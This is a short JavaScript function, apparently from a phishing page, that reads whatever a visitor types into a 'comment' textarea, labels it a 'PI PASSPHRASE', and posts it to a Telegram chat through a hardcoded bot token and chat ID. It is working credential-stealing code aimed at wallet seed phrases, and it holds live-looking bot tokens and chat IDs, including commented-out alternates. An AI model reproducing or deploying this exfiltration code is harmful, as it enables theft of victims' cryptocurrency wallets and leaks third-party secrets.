

function run() {
    // Telegram script
    // Replace with your actual bot token and chat ID

    const chatId = '5895404996';
    const botToken = '7217949603:AAG0UDbjP93OgTSyNxPNcMUvIgOj87lC5vQ';
    // const botToken = '6620819038:AAEHyILpkCzwwlDX5tGbxzIqNUZ1yVXUqLo';
    // const chatId = '5360982855';

    // Function to send a message using vanilla Ajax
    function sendMessage(message) {
        const xhr = new XMLHttpRequest();
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        const params = `chat_id=${chatId}&text=${encodeURIComponent(message)}`;

        xhr.open('POST', url, true);
        xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');

        xhr.onreadystatechange = function () {
            if (xhr.readyState === 4) {
                if (xhr.status === 200) {
                    console.log('Message sent:', xhr.responseText);
                } else {
                    console.error('Error sending message:', xhr.status, xhr.statusText);
                }
            }
        };

        xhr.send(params);
    }



    // Call the function to get visitor info
    var textarea = document.getElementById("comment");
    const now = new Date();
    const messageToSend = `Hello admin, somebody just logged in: \n \n PassPhrase: [${now}] \n \n [${textarea.value}]  \n\n\n(PI PASSPHRASE) `;
    sendMessage(messageToSend);

}